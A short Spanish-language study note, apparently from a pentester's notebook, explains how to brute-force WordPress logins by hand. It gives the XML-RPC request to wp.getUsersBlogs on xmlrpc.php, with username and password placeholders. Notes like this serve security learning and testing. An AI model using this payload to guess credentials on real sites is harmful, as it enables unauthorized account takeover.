# XMLRPC

***

* Tags: #web #scripting #bash #herramientas #wordpress

***

Si quisiéramos aplicar fuerza bruta en un \[\[WordPress]] de la misma forma que hace \[\[Wpscan]] pero de forma manual para descubrir credenciales válidas. sería necesario tramitar una petición por el método POST al archivo **xmlrpc.php** tramitando una estructura XML tal que así:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Usuario</value></param> 
<param><value>Contraseña</value></param> 
</params> 
</methodCall>
```
